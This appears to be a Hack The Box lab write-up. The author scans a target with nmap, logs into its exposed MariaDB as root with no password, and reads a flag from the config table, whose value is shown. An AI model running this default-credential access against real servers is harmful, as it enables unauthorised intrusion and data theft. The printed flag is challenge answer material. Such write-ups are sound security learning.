----
## Initial IPs

Attacker = 10.10.14.136
Victim = 10.129.242.53

----
## Initial Scan 

- Did the initial scan and found that MySQL is running on port 3306:
```shell

nmap -sV 10.129.242.53
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 15:13 EDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.129.242.53
Host is up (0.029s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 158.71 seconds

```
- Tried to login using with random passwords this didnt work. Went to mysql documentation and found that you can login in using root and no password this worked
```shell 
mysql -h 10.129.242.53 -u root

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 131
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 

```

- Went into the documentation to find a query to see what databases and tables exist. saw that a HTB database exists
```sql
SHOW TABLES;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```
- Selected the database 'htb' and looked at the tables and found that there iis a config and users table 
```shell
MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.018 sec)

```

- Found the flag in the config table
```sql
SELECT * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+

```
----
## Resources

Root with no password: https://dev.mysql.com/doc/refman/8.0/en/default-privileges.html#:~:text=If%20the%20root%20account%20has,a%20row%20in%20the%20mysql.
